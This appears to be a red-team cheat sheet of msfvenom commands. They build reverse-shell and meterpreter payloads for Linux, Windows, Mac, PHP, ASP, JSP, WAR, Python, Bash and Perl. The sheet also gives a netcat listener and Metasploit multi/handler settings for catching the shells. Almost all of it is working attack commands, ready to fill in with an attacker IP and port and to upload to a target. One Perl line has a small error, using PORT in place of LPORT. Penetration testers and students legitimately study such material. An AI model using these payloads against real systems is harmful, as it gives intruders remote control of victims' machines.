Payloads
--------



LHOST=<Your IP Address> 
LPORT=<Your Port to Connect On>




#Create connection to connect to on RedTeam(Linux)
nc -lvnp 4444



#Create shells to upload and execute on BlueTeam
msfvenom lhost=x.x.x.x lport=4444 -f exe --platform windows -p windows/shell_reverse_tcp > dev.exe
msfvenom lhost=x.x.x.x lport=4444 -f php --platform windows -p php/windows/shell_reverse_tcp > dev.exe

msfvenom -l 



Linux
-----
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=xxxx -f elf > shell.elf 


Windows
-------
msfvenom -p windows/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=xxxx -f exe > shell.exe 


Mac
---
msfvenom -p osx/x86/shell_reverse_tcp LHOST=x.x.x.x LPORT=xxxx -f macho > shell.macho


PHP
---
msfvenom -p php/meterpreter_reverse_tcp LHOST=x.x.x.x LPORT=xxxx -f raw > shell.php
cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php


ASP
---
msfvenom -p windows/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=xxxx -f asp > shell.asp 


JSP
---
msfvenom -p java/jsp_shell_reverse_tcp LHOST=x.x.x.x LPORT=xxxx -f raw > shell.jsp 


WAR
---
msfvenom -p java/jsp_shell_reverse_tcp LHOST=x.x.x.x LPORT=xxxx -f war > shell.war 



Python
------
msfvenom -p cmd/unix/reverse_python LHOST=x.x.x.x LPORT=xxxx -f raw > shell.py 


Bash
----
msfvenom -p cmd/unix/reverse_bash LHOST=x.x.x.x LPORT=xxxx -f raw > shell.sh 


Perl
----
msfvenom -p cmd/unix/reverse_perl LHOST=x.x.x.x PORT=xxxx -f raw > shell.pl 



Linux Based Shellcode
---------------------
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=xxxx -f <language> 


Windows Based Shellcode
-----------------------
msfvenom -p windows/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=xxxx -f <language> 


Mac Based Shellcode
-------------------
msfvenom -p osx/x86/shell_reverse_tcp LHOST=x.x.x.x LPORT=xxxx -f <language> 

Handlers

   use exploit/multi/handler 
   set PAYLOAD <Payload name> 
   set LHOST <LHOST value>    
   set LPORT <LPORT value>    
   set ExitOnSession false    
   exploit -j -z              

Once the required values are completed the following command will execute your handler – ‘msfconsole -L -r ‘
